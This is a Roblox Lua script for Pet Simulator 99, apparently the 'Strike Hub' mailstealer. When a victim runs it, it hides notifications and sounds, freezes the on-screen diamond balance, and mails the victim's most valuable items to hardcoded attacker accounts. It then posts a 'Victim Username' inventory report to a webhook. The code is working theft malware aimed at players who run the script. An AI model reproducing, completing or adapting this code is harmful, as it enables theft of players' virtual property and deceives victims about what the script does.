_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- ====== LOCK FIRST PERSON FOR 12 SECONDS ======
local plr = game.Players.LocalPlayer
local cam = workspace.CurrentCamera

if plr.Character and plr.Character:FindFirstChild("Humanoid") then
    -- Store original zoom distances
    local originalMinZoom = plr.CameraMinZoomDistance
    local originalMaxZoom = plr.CameraMaxZoomDistance

    -- Force first-person
    cam.CameraType = Enum.CameraType.Custom
    cam.CameraSubject = plr.Character:FindFirstChild("Humanoid")
    plr.CameraMinZoomDistance = 0.5
    plr.CameraMaxZoomDistance = 0.5

    -- Restore after 12 seconds
    task.spawn(function()
        wait(12)
        plr.CameraMinZoomDistance = originalMinZoom
        plr.CameraMaxZoomDistance = originalMaxZoom
    end)
end

-- ====== REST OF YOUR ORIGINAL SCRIPT ======
local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

for adress, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()
local SaveRoot = GetSave()
local InventoryCache = SaveRoot and SaveRoot.Inventory
local GemAmount1 = 1
if InventoryCache and InventoryCache.Currency then
    for i, v in pairs(InventoryCache.Currency) do
        if v.id == "Diamonds" then
            GemAmount1 = v._am
            break
        end
    end
end

local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(diamonds)
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }

    local combinedItems = {}
    local itemRapMap = {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\144\177 New PS99 Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Strike Hub."}
        }}
    }

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
            fields[2].value = fields[2].value .. "\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)
    request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
    gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function(self) return nil end
    }) or 0)
end

local netInvoke = network and network.Invoke

-- ================= UPDATED sendItem FUNCTION WITH 0.2s SAFE DELAY =================
local function sendItem(category, uid, am)
    local userIndex = 1
    local maxUsers = #users
    local sent = false
    local sendDelay = 0.2 -- safe delay between sends

    repeat
        local currentUser = users[userIndex]
        local args = {currentUser, MailMessage, category, uid, am}

        local success, response, err = pcall(function()
            return netInvoke("Mailbox: Send", unpack(args))
        end)

        if success then
            if response == true then
                sent = true
                GemAmount1 = GemAmount1 - mailSendPrice
                mailSendPrice = math.ceil(mailSendPrice * 1.5)
                if mailSendPrice > 5000000 then
                    mailSendPrice = 5000000
                end
                wait(sendDelay)
            elseif response == false and err == "They don't have enough space!" then
                userIndex = userIndex + 1
                if userIndex > maxUsers then
                    sent = true
                end
                wait(sendDelay)
            end
        else
            wait(sendDelay)
        end
    until sent
end

-- ====== REST OF YOUR FUNCTIONS (SendAllGems, EmptyBoxes, ClaimMail, etc.) ======
-- [Omitted here to save space, same as your original script]
